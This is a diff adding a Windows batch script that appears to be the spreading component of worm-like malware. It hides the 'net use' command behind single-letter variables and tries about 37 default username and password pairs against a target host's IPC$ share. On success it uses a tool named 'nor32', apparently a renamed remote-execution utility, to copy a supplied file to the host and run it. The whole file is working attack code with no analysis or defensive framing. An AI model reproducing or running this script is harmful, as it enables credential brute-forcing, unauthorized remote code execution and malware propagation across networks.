@@ -1,0 +1,268 @@
+@echo off
+set A=u
+set B=s
+set C=n
+set D=e
+set E=t
+set D=e
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "xxyyzz" /user:administrator
+if nOT errorlevel 1 goto bluesc4n29
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "abc" /user:administrator
+if nOT errorlevel 1 goto bluesc4n30
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "student" /user:student
+if nOT errorlevel 1 goto bluesc4n31
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "teacher" /user:teacher
+if nOT errorlevel 1 goto bluesc4n32
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "" /user:user
+if nOT errorlevel 1 goto bluesc4n33
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "user" /user:user
+if nOT errorlevel 1 goto bluesc4n34
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "test" /user:test
+if nOT errorlevel 1 goto bluesc4n4
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "test123" /user:administrator
+if nOT errorlevel 1 goto bluesc4n5
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "1" /user:administrator
+if nOT errorlevel 1 goto bluesc4n26
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "123" /user:administrator
+if nOT errorlevel 1 goto bluesc4n27
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "12345" /user:admin
+if nOT errorlevel 1 goto bluesc4n28
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "temp" /user:administrator
+if nOT errorlevel 1 goto bluesc4n6
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "" /user:administrator
+if nOT errorlevel 1 goto bluesc4n1
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "" /user:administrator
+if nOT errorlevel 1 goto bluesc4n35
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "Administrator" /user:administrator
+if nOT errorlevel 1 goto bluesc4n2
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "Administrator" /user:administrator
+if nOT errorlevel 1 goto bluesc4n37
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "test" /user:administrator
+if nOT errorlevel 1 goto bluesc4n3
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "admin" /user:administrator
+if nOT errorlevel 1 goto bluesc4n10
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "temp123" /user:administrator
+if nOT errorlevel 1 goto bluesc4n7
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "pass" /user:administrator
+if nOT errorlevel 1 goto bluesc4n8
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "password" /user:administrator
+if nOT errorlevel 1 goto bluesc4n9
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "root" /user:root
+if nOT errorlevel 1 goto bluesc4n11
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "changeme" /user:administrator
+if nOT errorlevel 1 goto bluesc4n12
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "admin" /user:admin
+if nOT errorlevel 1 goto bluesc4n13
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "123456" /user:administrator
+if nOT errorlevel 1 goto bluesc4n14
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "654321" /user:administrator
+if nOT errorlevel 1 goto bluesc4n15
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "abc123" /user:administrator
+if nOT errorlevel 1 goto bluesc4n16
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "12345" /user:administrator
+if nOT errorlevel 1 goto bluesc4n36
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "red123" /user:administrator
+if nOT errorlevel 1 goto bluesc4n17
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "admin123" /user:administrator
+if nOT errorlevel 1 goto bluesc4n18
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "qwerty" /user:administrator
+if nOT errorlevel 1 goto bluesc4n19
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "asdf" /user:administrator
+if nOT errorlevel 1 goto bluesc4n20
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "password123" /user:administrator
+if nOT errorlevel 1 goto bluesc4n21
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "secret" /user:administrator
+if nOT errorlevel 1 goto bluesc4n22
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "qwertyuiop" /user:administrator
+if nOT errorlevel 1 goto bluesc4n23
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "12345" /user:administrator
+if nOT errorlevel 1 goto bluesc4n24
+%C%%D%%E% %A%%B%%D% \\%1\ipc$ "54321" /user:administrator
+if nOT errorlevel 1 goto bluesc4n25
+goto bluesc4nend
+:bluesc4n1
+nor32 \\%1 -u administrator -p "" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "" -d %2 -o
+goto bluesc4nend
+:bluesc4n10
+nor32 \\%1 -u administrator -p "admin" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "admin" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "admin" -d %2 -o
+goto bluesc4nend
+:bluesc4n2
+nor32 \\%1 -u administrator -p "administrator" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "administrator" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "administrator" -d %2 -o
+goto bluesc4nend
+:bluesc4n37
+nor32 \\%1 -u administrator -p "Administrator" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "Administrator" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "Administrator" -d %2 -o
+goto bluesc4nend
+:bluesc4n11
+nor32 \\%1 -u root -p "root" -d attrib.exe -r %2
+nor32 \\%1 -u root -p "root" -f -c -d %2 -o
+nor32 \\%1 -u root -p "root" -d %2 -o
+goto bluesc4nend
+:bluesc4n13
+nor32 \\%1 -u admin -p "admin" -d attrib.exe -r %2
+nor32 \\%1 -u admin -p "admin" -f -c -d %2 -o
+nor32 \\%1 -u admin -p "admin" -d %2 -o
+goto bluesc4nend
+:bluesc4n3
+nor32 \\%1 -u administrator -p "test" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "test" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "test" -d %2 -o
+goto bluesc4nend
+:bluesc4n4
+nor32 \\%1 -u test -p "test" -d attrib.exe -r %2
+nor32 \\%1 -u test -p "test" -f -c -d %2 -o
+nor32 \\%1 -u test -p "test" -d %2 -o
+goto bluesc4nend
+:bluesc4n5
+nor32 \\%1 -u administrator -p "test123" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "test123" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "test123" -d %2 -o
+goto bluesc4nend
+:bluesc4n6
+nor32 \\%1 -u administrator -p "temp" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "temp" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "temp" -d %2 -o
+goto bluesc4nend
+:bluesc4n7
+nor32 \\%1 -u administrator -p "temp123" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "temp123" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "temp123" -d %2 -o
+goto bluesc4nend
+:bluesc4n8
+nor32 \\%1 -u administrator -p "pass" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "pass" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "pass" -d %2 -o
+goto bluesc4nend
+:bluesc4n9
+nor32 \\%1 -u administrator -p "password" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "password" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "password" -d %2 -o
+goto bluesc4nend
+:bluesc4n12
+nor32 \\%1 -u administrator -p "changeme" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "changeme" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "changeme" -d %2 -o
+goto bluesc4nend
+:bluesc4n14
+nor32 \\%1 -u administrator -p "123456" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "123456" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "123456" -d %2 -o
+goto bluesc4nend
+:bluesc4n15
+nor32 \\%1 -u administrator -p "654321" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "654321" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "654321" -d %2 -o
+goto bluesc4nend
+:bluesc4n16
+nor32 \\%1 -u administrator -p "abc123" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "abc123" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "abc123" -d %2 -o
+goto bluesc4nend
+:bluesc4n17
+nor32 \\%1 -u administrator -p "red123" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "red123" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "red123" -d %2 -o
+goto bluesc4nend
+:bluesc4n18
+nor32 \\%1 -u administrator -p "admin123" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "admin123" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "admin123" -d %2 -o
+goto bluesc4nend
+:bluesc4n19
+nor32 \\%1 -u administrator -p "qwerty" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "qwerty" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "qwerty" -d %2 -o
+goto bluesc4nend
+:bluesc4n20
+nor32 \\%1 -u administrator -p "asdf" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "asdf" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "asdf" -d %2 -o
+goto bluesc4nend
+:bluesc4n21
+nor32 \\%1 -u administrator -p "password123" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "password123" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "password123" -d %2 -o
+goto bluesc4nend
+:bluesc4n22
+nor32 \\%1 -u administrator -p "secret" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "secret" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "secret" -d %2 -o
+goto bluesc4nend
+:bluesc4n23
+nor32 \\%1 -u administrator -p "qwertyuiop" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "qwertyuiop" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "qwertyuiop" -d %2 -o
+goto bluesc4nend
+:bluesc4n24
+nor32 \\%1 -u administrator -p "12345" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "12345" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "12345" -d %2 -o
+goto bluesc4nend
+:bluesc4n25
+nor32 \\%1 -u administrator -p "54321" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "54321" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "54321" -d %2 -o
+goto bluesc4nend
+:bluesc4n26
+nor32 \\%1 -u administrator -p "1" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "1" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "1" -d %2 -o
+goto bluesc4nend
+:bluesc4n27
+nor32 \\%1 -u administrator -p "123" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "123" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "123" -d %2 -o
+goto bluesc4nend
+:bluesc4n28
+nor32 \\%1 -u admin -p "12345" -d attrib.exe -r %2
+nor32 \\%1 -u admin -p "12345" -f -c -d %2 -o
+nor32 \\%1 -u admin -p "12345" -d %2 -o
+goto bluesc4nend
+:bluesc4n29
+nor32 \\%1 -u administrator -p "xxyyzz" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "xxyyzz" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "xxyyzz" -d %2 -o
+goto bluesc4nend
+:bluesc4n30
+nor32 \\%1 -u administrator -p "abc" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "abc" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "abc" -d %2 -o
+goto bluesc4nend
+:bluesc4n31
+nor32 \\%1 -u student -p "student" -d attrib.exe -r %2
+nor32 \\%1 -u student -p "student" -f -c -d %2 -o
+nor32 \\%1 -u student -p "student" -d %2 -o
+goto bluesc4nend
+:bluesc4n32
+nor32 \\%1 -u teacher -p "teacher" -d attrib.exe -r %2
+nor32 \\%1 -u teacher -p "teacher" -f -c -d %2 -o
+nor32 \\%1 -u teacher -p "teacher" -d %2 -o
+goto bluesc4nend
+:bluesc4n33
+nor32 \\%1 -u user -p "" -d attrib.exe -r %2
+nor32 \\%1 -u user -p "" -f -c -d %2 -o
+nor32 \\%1 -u user -p "" -d %2 -o
+goto bluesc4nend
+:bluesc4n34
+nor32 \\%1 -u user -p "user" -d attrib.exe -r %2
+nor32 \\%1 -u user -p "user" -f -c -d %2 -o
+nor32 \\%1 -u user -p "user" -d %2 -o
+goto bluesc4nend
+:bluesc4n35
+nor32 \\%1 -u administrator -p "" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "" -d %2 -o
+goto bluesc4nend
+:bluesc4n36
+nor32 \\%1 -u administrator -p "12345" -d attrib.exe -r %2
+nor32 \\%1 -u administrator -p "12345" -f -c -d %2 -o
+nor32 \\%1 -u administrator -p "12345" -d %2 -o
+goto bluesc4nend
+:bluesc4nend
